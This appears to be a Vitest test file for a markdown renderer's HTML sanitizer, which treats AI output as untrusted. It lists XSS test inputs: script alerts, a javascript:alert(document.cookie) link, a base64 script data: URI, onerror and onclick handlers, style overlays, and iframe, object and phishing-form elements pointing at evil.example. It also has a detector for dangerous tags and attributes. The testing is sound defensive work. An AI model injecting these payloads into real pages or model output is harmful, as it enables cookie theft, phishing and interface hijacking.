/**
 * Contract tests for the markdown sanitize schema's class lockdown: model
 * output is untrusted, and compiled Tailwind utilities are present in the
 * bundle — a surviving `class="fixed inset-0 z-50"` on raw HTML would let
 * assistant text overlay and intercept the whole app. Only the renderer-owned
 * `language-*` token on code may survive (fence detection + mermaid routing).
 */
import { parseHTML } from "linkedom";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { I18nProvider } from "./i18n";
import { MarkdownRenderer } from "./markdown";

function render(content: string): string {
	return renderToStaticMarkup(
		<I18nProvider>
			<MarkdownRenderer content={content} />
		</I18nProvider>,
	);
}

describe("markdown sanitize class lockdown", () => {
	it("drops arbitrary classes from raw spans (overlay hijack)", () => {
		const html = render('<span class="fixed inset-0 z-[70] bg-black">covered</span>');
		expect(html).toContain("covered");
		expect(html).not.toContain("fixed");
		expect(html).not.toContain("inset-0");
		expect(html).not.toContain("z-[70]");
	});

	it("keeps fenced code language classes for badge and mermaid routing", () => {
		const html = render("```ts\nconst x = 1\n```");
		expect(html).toContain(">typescript</span>");
		const mermaid = render("```mermaid\ngraph TD\nA-->B\n```");
		expect(parseHTML(mermaid).document.documentElement.textContent).toContain("graph TD");
	});

	it("strips non-language tokens from raw code class lists", () => {
		const html = render('<code class="language-js fixed">x()</code>');
		expect(html).not.toContain("fixed");
	});

	it("still renders raw HTML content after attribute stripping", () => {
		const html = render('<mark class="bg-red-500">kept</mark>');
		expect(html).toContain("kept");
	});
});

/** Every executable or app-restyling construct left in rendered markdown. */
function activeContentIn(html: string): string[] {
	const { document } = parseHTML(`<html><body>${html}</body></html>`);
	const problems: string[] = [];
	for (const el of document.querySelectorAll("script,iframe,object,embed,form,style,base,meta,link")) {
		problems.push(`<${el.localName}>`);
	}
	for (const el of document.querySelectorAll("*")) {
		for (const { name, value } of Array.from(el.attributes as ArrayLike<{ name: string; value: string }>)) {
			const lower = name.toLowerCase();
			if (lower.startsWith("on")) problems.push(`${el.localName}[${name}]`);
			if (lower === "style") problems.push(`${el.localName}[style]`);
			if (/^\s*javascript:/i.test(value)) problems.push(`${el.localName}[${name}=${value}]`);
			if (lower === "href" && /^\s*data:/i.test(value)) problems.push(`${el.localName}[href=data:]`);
		}
	}
	return problems;
}

/** Text a reader sees: element text plus image alt text. */
function readableText(html: string): string {
	const { document } = parseHTML(`<html><body>${html}</body></html>`);
	const alts = Array.from(document.querySelectorAll("img[alt]"), img => img.getAttribute("alt"));
	return [document.body.textContent ?? "", ...alts].join(" ");
}

interface HostileCase {
	vector: string;
	/** The vector as raw HTML on its own block. */
	raw: string;
	/** The vector inside markdown structure (list, emphasis) or markdown link syntax. */
	markdown: string;
	/** Readable text that must survive sanitation. */
	kept: string[];
	/** Payload text that must not reach the page. */
	dropped: string[];
}

const HOSTILE: HostileCase[] = [
	{
		vector: "<script>",
		raw: "intro\n\n<script>alert('pwned')</script>\n\noutro",
		markdown: "- **intro** <script>alert('pwned')</script> outro",
		kept: ["intro", "outro"],
		dropped: ["alert('pwned')"],
	},
	{
		vector: "<iframe>",
		raw: 'intro\n\n<iframe src="https://evil.example/">frame body</iframe>\n\noutro',
		markdown: '- **intro** <iframe src="https://evil.example/">frame body</iframe> outro',
		kept: ["intro", "outro"],
		dropped: ["frame body", "evil.example"],
	},
	{
		vector: "<object>",
		raw: 'intro\n\n<object data="https://evil.example/x.swf">object body</object>\n\noutro',
		markdown: '- **intro** <object data="https://evil.example/x.swf">object body</object> outro',
		kept: ["intro", "outro"],
		dropped: ["object body", "evil.example"],
	},
	{
		vector: "<form>",
		raw: '<form action="https://evil.example/collect">Sign in again</form>',
		markdown: '- **intro** <form action="https://evil.example/collect">Sign in again</form> outro',
		kept: ["Sign in again"],
		dropped: ["evil.example"],
	},
	{
		vector: "a style attribute",
		raw: '<p style="position:fixed;inset:0;z-index:99">covered</p>',
		markdown: '- **intro** <span style="position:fixed;inset:0">covered</span> outro',
		kept: ["covered"],
		dropped: ["position:fixed"],
	},
	{
		vector: "on* handlers",
		raw: '<p onclick="alert(1)" onmouseover="alert(2)">hover me</p>',
		markdown: '- **intro** <b onclick="alert(1)" onfocus="alert(2)">hover me</b> outro',
		kept: ["hover me"],
		dropped: ["alert(1)", "alert(2)"],
	},
	{
		vector: "a javascript: link",
		raw: '<a href="javascript:alert(document.cookie)">open me</a>',
		markdown: "[open me](javascript:alert(document.cookie))",
		kept: ["open me"],
		dropped: ["document.cookie"],
	},
	{
		vector: "a data: link",
		raw: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">open me</a>',
		markdown: "[open me](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
		kept: ["open me"],
		dropped: ["PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg"],
	},
	{
		vector: "<img onerror>",
		raw: `<img src="${"data:image/png;base64,iVBORw0KGgo="}" onerror="alert(1)" alt="chart">`,
		markdown: '- **intro** <img src="missing.png" onerror="alert(1)" alt="chart"> outro',
		kept: ["chart"],
		dropped: ["alert(1)"],
	},
];

describe("markdown sanitize hostile input", () => {
	const rows = HOSTILE.flatMap(entry => [
		{ ...entry, form: "raw HTML", content: entry.raw },
		{ ...entry, form: "markdown", content: entry.markdown },
	]);

	it.each(rows)("neutralises $vector ($form) and keeps the text", ({ content, kept, dropped }) => {
		const html = render(content);
		expect(activeContentIn(html)).toEqual([]);
		const text = readableText(html);
		for (const fragment of kept) expect(text).toContain(fragment);
		// Checked as text too: React encodes quotes in markup, so a surviving
		// payload such as alert('x') never appears verbatim in the HTML string.
		for (const fragment of dropped) {
			expect(text).not.toContain(fragment);
			expect(html).not.toContain(fragment);
		}
	});

	it("keeps the image a raw <img onerror> carried, minus the handler", () => {
		const html = render(HOSTILE.find(entry => entry.vector === "<img onerror>")!.raw);
		const img = parseHTML(`<html><body>${html}</body></html>`).document.querySelector("img");
		expect(img?.getAttribute("alt")).toBe("chart");
		expect(img?.hasAttribute("onerror")).toBe(false);
	});
});
